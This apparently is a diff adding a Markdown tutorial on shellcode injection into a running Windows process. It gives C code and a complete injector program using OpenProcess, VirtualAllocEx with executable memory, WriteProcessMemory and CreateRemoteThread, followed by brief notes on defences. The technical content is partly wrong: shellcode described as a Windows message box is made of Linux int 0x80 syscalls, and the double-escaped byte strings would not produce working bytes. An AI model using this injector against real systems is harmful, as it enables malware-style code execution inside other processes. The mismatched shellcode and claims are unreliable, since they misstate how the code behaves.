@@ -1,0 +1,169 @@
+# Inject the shellcode into the running process byte by byte.
+
+
+# 👉 Overview
+
+---
+
+### 👀 What ?
+
+> Injecting shellcode into a running process is a technique used by cybersecurity professionals, particularly penetration testers and ethical hackers, to test the integrity of a system. Shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. Injecting it into a running process can manipulate the process to perform actions that it wasn't initially designed to do.
+> 
+
+### 🧐 Why ?
+
+> The importance of understanding how to inject shellcode into a running process lies in its potential for exploitation. Unethical hackers can use this technique to gain unauthorized access to a system, manipulate data, or even gain complete control over a network. Therefore, cybersecurity professionals need to understand this technique to better protect their systems and networks. It's also a fundamental skill for penetration testers and red team members to emulate real-world hacking scenarios and identify vulnerabilities.
+> 
+
+### ⛏️ How ?
+
+> Injecting shellcode into a running process involves several steps. First, you need to identify a vulnerable process. This can be done using various tools and techniques such as fuzzing or exploit development. Once a vulnerable process is identified, you write the shellcode that will be injected. This shellcode should be designed to perform the desired action, such as creating a backdoor or escalating privileges. Next, you inject the shellcode into the running process. This can be done using various methods, including DLL injection, process hollowing, or even direct memory writing. Finally, the injected shellcode is executed, causing the running process to perform the intended action.
+> 
+
+### ⏳ When ?
+
+> The practice of injecting shellcode into running processes has been around since the early days of software vulnerability exploitation. It's a common technique in the realm of cybersecurity, particularly in penetration testing and ethical hacking.
+> 
+
+# ⚙️ Technical Explanations
+
+---
+
+### Overview
+
+Shellcode injection is an advanced technique used in cybersecurity to execute arbitrary code within the memory space of a running process. This method exploits the target process’s memory management and often involves intricate knowledge of assembly language and operating system internals. Shellcode is typically written in machine code, tailored to perform specific actions when executed. The injection process generally involves the following steps:
+
+1. **Allocating Space**: Allocate space in the target process’s memory for the shellcode.
+2. **Writing the Shellcode**: Write the shellcode into the allocated space.
+3. **Redirecting Execution Flow**: Redirect the process’s execution flow to the injected shellcode.
+
+### Steps of Shellcode Injection
+
+### 1. Allocating Space
+
+Allocating memory within the target process is the first step. In Windows, the `VirtualAllocEx` function can be used to allocate memory that is both readable and executable. This ensures that the shellcode can be executed once it is written into this space.
+
+```c
+HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+LPVOID allocatedMemory = VirtualAllocEx(processHandle, NULL, sizeOfShellcode, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+```
+
+- `OpenProcess`: Opens the target process with the necessary access rights.
+- `VirtualAllocEx`: Allocates memory in the target process. The memory is both committed and reserved, and its protection is set to allow execution (`PAGE_EXECUTE_READWRITE`).
+
+### 2. Writing the Shellcode
+
+After allocating the necessary memory, the shellcode is written into this space using `WriteProcessMemory`.
+
+```c
+unsigned char shellcode[] =
+"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xeb\\x32\\x5b\\xb0\\x05\\x31\\xc9\\xcd"
+"\\x80\\x89\\xc6\\xeb\\x06\\xb0\\x01\\x31\\xdb\\xcd\\x80\\x89\\xf3\\xb0\\x03\\x83"
+"\\xec\\x01\\x8d\\x0c\\x24\\xb2\\x01\\xcd\\x80\\x31\\xdb\\x39\\xc3\\x74\\xe6\\xb0"
+"\\x04\\xb3\\x01\\xb2\\x01\\xcd\\x80\\x83\\xc4\\x01\\xeb\\xdf\\xe8\\xc9\\xff\\xff"
+"\\xff";
+
+DWORD bytesWritten;
+WriteProcessMemory(processHandle, allocatedMemory, shellcode, sizeof(shellcode), &bytesWritten);
+
+```
+
+- `WriteProcessMemory`: Writes the shellcode into the allocated memory space in the target process.
+
+### 3. Redirecting Execution Flow
+
+To execute the shellcode, the process’s execution flow must be redirected to the address of the injected shellcode. This can be done by creating a remote thread that starts execution at the shellcode’s address.
+
+```c
+CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL);
+
+```
+
+- `CreateRemoteThread`: Creates a thread in the target process, starting execution at the allocated memory containing the shellcode.
+
+### Example of Shellcode Injection
+
+Here's a complete example showing how to perform shellcode injection to display a message box on a Windows system:
+
+### C Program to Inject Shellcode
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+int main(int argc, char* argv[]) {
+    // Assuming the target process ID is passed as an argument
+    DWORD processId = atoi(argv[1]);
+    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (processHandle == NULL) {
+        printf("Failed to open process\\n");
+        return 1;
+    }
+
+    // Shellcode for displaying a message box
+    unsigned char shellcode[] =
+        "\\x31\\xc0\\x50\\x68\\x6c\\x6f\\x20\\x21\\x68\\x20\\x57\\x6f\\x72\\x68\\x48"
+        "\\x65\\x6c\\x6c\\x89\\xe1\\x31\\xd2\\x6a\\x00\\x52\\x51\\x31\\xdb\\xb3\\x40"
+        "\\xcd\\x80";
+
+    // Allocate memory in the target process
+    LPVOID allocatedMemory = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (allocatedMemory == NULL) {
+        printf("Failed to allocate memory\\n");
+        CloseHandle(processHandle);
+        return 1;
+    }
+
+    // Write the shellcode into the allocated memory
+    SIZE_T bytesWritten;
+    if (!WriteProcessMemory(processHandle, allocatedMemory, shellcode, sizeof(shellcode), &bytesWritten)) {
+        printf("Failed to write memory\\n");
+        VirtualFreeEx(processHandle, allocatedMemory, 0, MEM_RELEASE);
+        CloseHandle(processHandle);
+        return 1;
+    }
+
+    // Create a remote thread to execute the shellcode
+    HANDLE threadHandle = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL);
+    if (threadHandle == NULL) {
+        printf("Failed to create remote thread\\n");
+        VirtualFreeEx(processHandle, allocatedMemory, 0, MEM_RELEASE);
+        CloseHandle(processHandle);
+        return 1;
+    }
+
+    // Wait for the remote thread to finish
+    WaitForSingleObject(threadHandle, INFINITE);
+
+    // Clean up
+    VirtualFreeEx(processHandle, allocatedMemory, 0, MEM_RELEASE);
+    CloseHandle(threadHandle);
+    CloseHandle(processHandle);
+
+    return 0;
+}
+
+```
+
+### Steps to Execute
+
+1. **Compile the Program**: Compile the C program using a compiler like `gcc` or `cl` (Visual Studio Compiler).
+2. **Run the Program**: Execute the compiled binary with the target process ID as an argument.
+
+```bash
+injector.exe <target_process_id>
+
+```
+
+### Defense Mechanisms
+
+Modern operating systems employ several defense mechanisms to protect against shellcode injection:
+
+1. **Data Execution Prevention (DEP)**: Prevents execution of code from non-executable memory regions.
+2. **Address Space Layout Randomization (ASLR)**: Randomizes the memory addresses of key data areas to make it harder for attackers to predict target locations.
+3. **Code Signing**: Ensures that only trusted code is executed by validating digital signatures.
+
+### Conclusion
+
+Shellcode injection is a powerful and sophisticated technique in cybersecurity, enabling attackers to execute arbitrary code within a target process. This process involves allocating memory, writing shellcode, and redirecting execution flow. Understanding these concepts is essential for cybersecurity professionals to develop effective defenses and for ethical hackers to identify and mitigate vulnerabilities. Always ensure that such techniques are used responsibly and legally within controlled environments.
